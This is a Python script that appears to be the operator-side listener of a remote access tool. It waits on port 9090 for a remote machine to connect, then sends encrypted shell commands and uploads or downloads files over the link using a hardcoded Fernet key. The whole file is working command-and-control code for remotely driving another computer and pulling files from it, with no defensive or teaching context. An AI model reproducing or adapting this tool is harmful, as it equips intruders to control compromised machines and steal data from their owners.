from __future__ import print_function
from socket import socket, error
from cryptography.fernet import Fernet
key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
cipher_suite = Fernet(key)


def encrypt_cmd(cmd):
    return cipher_suite.encrypt(cmd)


def decrypt_response(response):
    return cipher_suite.decrypt(response)


def connection():
    s = socket()
    host = ""
    port = 9090
    s.bind((host, port))
    s.listen(1)
    print("Listening ......")
    conn, address = s.accept()
    print("Connected with " + str(address))
    response = conn.recv(1024)
    response = decrypt_response(response)
    print(response, end="")
    while True:
        cmd = (raw_input(">"))
        if cmd[:6] == "upload":
            file = cmd[8:].split(",,")
            if len(file) == 2:
                try:
                    with open(file[0], "rb") as f:
                        data = f.read()
                        file_data = (cmd[:6] + file[1] + "||=shail=||" + data)
                        file_data = encrypt_cmd(file_data)
                        conn.send(file_data)
                    response = decrypt_response(conn.recv(1024))
                    print(response, end="")
                except IOError:
                    print("Not Any File Found")
            else:
                print("Check your input")
        elif cmd[:8] == "download":
            file = cmd[10:].split(",,")
            if len(file) == 2:
                file_data = (cmd[:8] + file[0])
                file_data = encrypt_cmd(file_data)
                conn.send(file_data)
                data = conn.recv(20000000)
                data = decrypt_response(data).split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    with open(file[1], "wb") as f:
                        f.write(data[0])
                    print("File Has Been Received")
                print(data[1], end="")
            else:
                print("Check your input")
        elif len(cmd) > 0:
            cmd = encrypt_cmd(cmd)
            conn.send(cmd)
            response = conn.recv(9999)
            response = decrypt_response(response)
            print(response, end="")


while True:
    try:
        connection()
    except error as msg:
        print(msg)
        print("Retrying ...")
